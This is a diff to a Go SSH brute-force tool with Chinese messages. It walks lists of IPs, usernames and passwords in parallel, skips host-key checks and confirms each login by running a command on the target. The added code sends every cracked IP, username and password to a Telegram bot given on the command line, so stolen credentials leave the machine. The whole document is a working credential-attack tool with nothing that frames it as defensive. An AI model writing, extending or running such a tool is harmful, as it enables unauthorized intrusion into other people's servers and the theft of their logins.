@@ -2,7 +2,10 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"fmt"
+	"io"
+	"net/http"
 	"os"
 	"strings"
 	"sync"
@@ -11,25 +14,40 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
+var (
+	telegramBotToken string
+	telegramChatID   string
+)
+
 func main() {
-	if len(os.Args) != 5 {
-		fmt.Println("用法: ./程序 ip.txt user.txt pass.txt 最大线程数")
+	if len(os.Args) != 7 {
+		fmt.Println("用法: ./程序 ip.txt user.txt pass.txt 最大线程数 BotToken ChatID")
 		return
 	}
 
-	ips := readLines(os.Args[1])
-	users := readLines(os.Args[2])
-	passwords := readLines(os.Args[3])
+	ipFile := os.Args[1]
+	userFile := os.Args[2]
+	passFile := os.Args[3]
 	threadLimit := parseInt(os.Args[4], 10)
+	telegramBotToken = os.Args[5]
+	telegramChatID = os.Args[6]
 
-	sem := make(chan struct{}, threadLimit) // 并发控制
+	// 禁用 SSH agent
+	os.Unsetenv("SSH_AUTH_SOCK")
+	os.Unsetenv("SSH_AGENT_PID")
+
+	ips := readLines(ipFile)
+	users := readLines(userFile)
+	passwords := readLines(passFile)
+
+	sem := make(chan struct{}, threadLimit)
 	var wg sync.WaitGroup
 	var fileMu sync.Mutex
 
 	for _, ip := range ips {
 		for _, user := range users {
 			for _, pass := range passwords {
-				ip, user, pass := ip, user, pass // 避免闭包变量问题
+				ip, user, pass := ip, user, pass
 				sem <- struct{}{}
 				wg.Add(1)
 				go func() {
@@ -37,11 +55,13 @@ func main() {
 					defer func() { <-sem }()
 					if trySSH(ip, user, pass) {
 						fileMu.Lock()
-						appendLine("success.txt", fmt.Sprintf("%s %s %s", ip, user, pass))
+						line := fmt.Sprintf("%s %s %s", ip, user, pass)
+						appendLine("success.txt", line)
+						sendTelegramMessage(fmt.Sprintf("✅ 成功登录:\nIP: %s\n用户: %s\n密码: %s", ip, user, pass))
 						fileMu.Unlock()
-						fmt.Printf("[成功] %s %s %s\n", ip, user, pass)
+						fmt.Printf("[✅ 成功] %s\n", line)
 					} else {
-						fmt.Printf("[失败] %s %s %s\n", ip, user, pass)
+						fmt.Printf("[❌ 失败] %s@%s\n", user, ip)
 					}
 				}()
 			}
@@ -49,28 +69,59 @@ func main() {
 	}
 
 	wg.Wait()
-	fmt.Println("🎉 所有组合尝试完毕")
+	fmt.Println("🎉 所有尝试完成。")
 }
 
 func trySSH(ip, username, password string) bool {
 	config := &ssh.ClientConfig{
-		User:            username,
-		Auth:            []ssh.AuthMethod{ssh.Password(password)},
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
 		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 		Timeout:         5 * time.Second,
 	}
+
 	conn, err := ssh.Dial("tcp", ip+":22", config)
 	if err != nil {
 		return false
 	}
 	defer conn.Close()
-	return true
+
+	session, err := conn.NewSession()
+	if err != nil {
+		return false
+	}
+	defer session.Close()
+
+	output, err := session.Output("echo success")
+	if err != nil {
+		return false
+	}
+
+	return strings.TrimSpace(string(output)) == "success"
+}
+
+func sendTelegramMessage(message string) {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramBotToken)
+	body := fmt.Sprintf("chat_id=%s&text=%s", telegramChatID, message)
+
+	req, _ := http.NewRequest("POST", url, bytes.NewBufferString(body))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		fmt.Printf("❌ 推送 Telegram 失败: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
+	io.Copy(io.Discard, resp.Body)
 }
 
 func readLines(filename string) []string {
 	file, err := os.Open(filename)
 	if err != nil {
-		fmt.Printf("❌ 无法读取文件: %s\n", filename)
+		fmt.Printf("❌ 打开文件失败: %s\n", filename)
 		os.Exit(1)
 	}
 	defer file.Close()
@@ -78,9 +129,9 @@ func readLines(filename string) []string {
 	var lines []string
 	scanner := bufio.NewScanner(file)
 	for scanner.Scan() {
-		text := strings.TrimSpace(scanner.Text())
-		if text != "" {
-			lines = append(lines, text)
+		t := strings.TrimSpace(scanner.Text())
+		if t != "" {
+			lines = append(lines, t)
 		}
 	}
 	return lines
